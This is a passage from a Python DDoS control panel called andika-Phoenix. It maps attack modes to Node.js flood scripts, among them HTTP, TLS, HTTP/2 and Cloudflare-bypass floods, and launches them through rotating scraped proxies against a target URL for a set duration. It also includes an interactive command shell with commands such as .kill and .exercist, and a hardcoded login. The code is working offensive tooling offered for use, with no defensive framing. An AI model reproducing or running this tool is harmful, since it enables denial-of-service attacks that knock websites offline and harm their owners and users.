            f'{methods_dir}H2F3.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HTTP.js', [target, duration],
            f'{methods_dir}Cloudflare.js', [target, duration, '100'],
            f'{methods_dir}RAND.js', [target, duration],
            f'{methods_dir}TLS.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}R2.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HTTPS.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HTTP-RAW.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HTTPX.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}BLAST.js', [target, duration, '100', '10', 'proxy.txt']
        ],
        'exercist': [
            f'{methods_dir}novaria.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}pidoras.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}floods.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}browser.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}CBROWSER.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}H2CA.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}H2F3.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}H2GEC.js', [target, duration, '100', '10', '3', 'proxy.txt'],
            f'{methods_dir}HTTP.js', [target, duration],
            f'{methods_dir}FLUTRA.js', [target, duration],
            f'{methods_dir}Cloudflare.js', [target, duration, '100'],
            f'{methods_dir}CFbypass.js', [target, duration],
            f'{methods_dir}bypassv1', [target, 'proxy.txt', duration, '100', '10'],
            f'{methods_dir}hyper.js', [target, duration, '100'],
            f'{methods_dir}RAND.js', [target, duration],
            f'{methods_dir}TLS.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}TLS-LOST.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}TLS-BYPASS.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}tls.vip', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}R2.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HTTPS.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}HTTPX.js', [target, duration, '100', '10', 'proxy.txt'],
            f'{methods_dir}BLAST.js', [target, duration, '100', '10', 'proxy.txt']
        ]
    }
    
    if method not in method_map:
        print(f"{Colors.RED}[-] Unknown method: {method}{Colors.RESET}")
        with attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        return False
    
    anim_thread = threading.Thread(
        target=show_attack_animation,
        args=(attack_id, method, target, duration),
        daemon=True
    )
    anim_thread.start()
    
    def run_attacks():
        scripts = method_map[method]
        for i in range(0, len(scripts), 2):
            if i+1 >= len(scripts):
                break
            script = scripts[i]
            args = scripts[i+1]
            try:
                subprocess.Popen(['node', script] + args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as e:
                print(f"\n{Colors.RED}[-] Error running {script}: {e}{Colors.RESET}")
        
        time.sleep(int(duration))
        
        with attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
    
    attack_thread = threading.Thread(target=run_attacks, daemon=True)
    attack_thread.start()
    
    return True

def c2_panel():
    while True:
        try:
            sys.stdout.write(f"\x1b]2;andika-Phoenix :: Online: [1] :: Active: [{len(active_attacks)}]\x07")
            
            cmd = input(f"\n{Colors.RED}[andika-Phoenix]{Colors.RESET} {Colors.RED}~# {Colors.RESET}").strip()
            
            if not cmd:
                continue
            
            parts = cmd.split()
            command = parts[0].lower()
            
            if command in ['.clear', '.cls', 'clear', 'cls']:
                print_banner()
                continue
            
            elif command in ['.help', '.menu', 'help', 'menu', '?']:
                show_help()
                continue
            
            elif command in ['.methods', '.list', '.ls', '.show']:
                show_all_methods()
                continue
            
            elif command in ['.exit', '.quit', 'exit', 'quit']:
                if active_attacks:
                    print(f"{Colors.YELLOW}[!] Stopping all active attacks...{Colors.RESET}")
                    stop_all_attacks()
                    time.sleep(1)
                print(f"{Colors.YELLOW}[!] Exiting...{Colors.RESET}")
                sys.exit(0)
            
            elif command in ['.info', 'info']:
                show_info()
                continue
            
            elif command in ['.status', 'status']:
                show_status()
                continue
            
            elif command in ['.stop', 'stop']:
                stop_all_attacks()
                continue
            
            elif command == '.proxy':
                scrape_proxy()
                continue
            
            elif command in ['.kill', '.phoenix', '.exorcist', '.blaze', '.ultimate', '.exercist']:
                if len(parts) < 3:
                    print(f"{Colors.RED}[-] Usage: {command} <URL> <TIME>{Colors.RESET}")
                    print(f"{Colors.YELLOW}[!] Example: {command} http://example.com 60{Colors.RESET}")
                    continue
                
                target = parts[1]
                duration = parts[2]
                
                try:
                    int(duration)
                except ValueError:
                    print(f"{Colors.RED}[-] Invalid duration: {duration}{Colors.RESET}")
                    continue
                
                method = command[1:] if command.startswith('.') else command
                execute_attack(target, duration, method)
            
            else:
                print(f"{Colors.RED}[-] Unknown command: {command}{Colors.RESET}")
                print(f"{Colors.YELLOW}[!] Type '.help' or '.methods' for available commands{Colors.RESET}")
        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Exiting...{Colors.RESET}")
            sys.exit(0)
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")

def login():
    clear_screen()
    print_banner()
    
    print(f"""
{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════════╗
║                    LOGIN REQUIRED                            ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)
    
    default_user = "irul"
    default_pass = "123"
    
    try:
        username = input(f"{Colors.CYAN}[{Colors.GREEN}USERNAME{Colors.CYAN}]: {Colors.RESET}")
        password = input(f"{Colors.CYAN}[{Colors.GREEN}PASSWORD{Colors.CYAN}]: {Colors.RESET}")
        
        if username == default_user and password == default_pass:
            print(f"\n{Colors.GREEN}[+] Login successful! Welcome {username}{Colors.RESET}")
            time.sleep(1)
            
            print(f"{Colors.YELLOW}[*] Loading user agents...{Colors.RESET}")
            threading.Thread(target=scrape_user_agent, daemon=True).start()
            time.sleep(1)
            
            print(f"{Colors.YELLOW}[*] Checking for existing proxies...{Colors.RESET}")
            if load_proxies_from_file():
                print(f"{Colors.GREEN}[+] Proxies loaded from proxy.txt{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}[!] No proxy file found. Downloading proxies...{Colors.RESET}")
                threading.Thread(target=scrape_proxy, daemon=True).start()
                time.sleep(2)
            
            time.sleep(1)
            clear_screen()
            print_banner()
            
            if proxies_loaded:
                print(f"{Colors.GREEN}[+] Ready! {len(proxy_list)} proxies loaded.{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}[!] Proxies are being downloaded in background...{Colors.RESET}")
                print(f"{Colors.YELLOW}[!] You can start attacking once download completes.{Colors.RESET}")
            
            c2_panel()
        else:
            print(f"\n{Colors.RED}[-] Invalid credentials! Access denied.{Colors.RESET}")
            time.sleep(2)
            sys.exit(1)
    
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Login cancelled{Colors.RESET}")
        sys.exit(0)

def main():
    try:
        subprocess.run(['node', '--version'], capture_output=True, check=True)
    except FileNotFoundError:
        print(f"{Colors.RED}[-] Node.js is not installed!{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Visit: https://nodejs.org/{Colors.RESET}")
        sys.exit(1)
    
    login()

if __name__ == "__main__":
    main()
